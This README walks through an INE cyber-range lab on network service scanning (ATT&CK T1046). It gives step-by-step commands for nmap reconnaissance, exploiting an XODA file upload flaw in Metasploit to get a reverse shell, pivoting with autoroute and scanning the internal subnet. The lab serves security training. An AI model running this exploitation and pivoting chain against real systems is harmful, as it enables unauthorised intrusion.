# T1046: Network Service Scanning – INE Lab Walkthrough

**Category:** `network-reconnaissance/service-scanning`

This README documents each step performed in the INE lab titled **"T1046: Network Service Scanning"**, including commands used, screenshots taken, and their function. Each step builds upon the last to simulate realistic adversarial behavior during reconnaissance and lateral movement.

---

## 🔎 Step 1: Check Target Availability (Ping)
```bash
ping -c 4 demo.ine.local
```
✅ Confirms if the target is up and reachable.

---

## ⚡ Step 2: Nmap Scan with Service Version Detection
```bash
nmap -sV -Pn -oX myscan.xml demo.ine.local
```
- `-sV`: Detect service versions
- `-Pn`: Skip ping discovery (assume host is up)
- `-oX`: Save output in XML format for MSF import

🔽 **Output showed:**
- HTTP service on port 80 running **HttpFileServer httpd 2.3**
- RDP and SMB ports open

---

## 🐘 Step 3: Start PostgreSQL Database (for Metasploit)
```bash
service postgresql start
```
Ensures the Metasploit database backend is available for importing Nmap results.

---

## 💣 Step 4: Launch Metasploit Console
```bash
msfconsole
```

---

## 📦 Step 5: Check DB Status
```bash
db_status
```
Should return: `connected to msf` ✅

---

## 📥 Step 6: Import Nmap XML Results into MSF
```bash
db_import myscan.xml
```

---

## 🧠 Step 7: View Hosts and Services
```bash
hosts
services
```
Used to confirm target information and open services.

---

## 🌐 Step 8: Manual HTTP Request with curl
```bash
curl demo1.ine.local
```
Identifies a login page running **XODA** web application.

---

## 🚀 Step 9: Exploit XODA File Upload Vulnerability
```bash
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST <your-ip>
exploit
```
✅ Successful reverse shell access to target machine.

---

## 🛰️ Step 10: Add Route for Internal Scanning
```bash
run autoroute -s 192.168.134.0/24
```
Adds route to pivot through the current session.

---

## 🧪 Step 11: Run Port Scan Script via Metasploit
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.134.0/24
set PORTS 1-1000
set THREADS 20
run
```
✅ Scans internal network using the pivoted route.

---

## 📂 Step 12: Upload Bash Script for Custom Port Scan
```bash
upload portscan.sh
chmod +x portscan.sh
./portscan.sh
```
Performs custom internal port scan from within compromised host.

---

## 📝 Notes
- This lab demonstrates how attackers can chain service scanning, exploitation, pivoting, and internal discovery.
- All commands are tested on INE’s Cyber Range.

---

## 📎 Screenshots
(Screenshots can be placed in order:
`1.png` → `12.png` to reflect each step above.)

---

## 🧠 Related Concepts
- Nmap XML integration with MSF
- Web app exploitation with Metasploit
- Post-exploitation pivoting
- Internal service enumeration

---

## 📚 Reference
- INE Lab: `T1046: Network Service Scanning`
- XODA Exploit Path: `exploit/unix/webapp/xoda_file_upload`
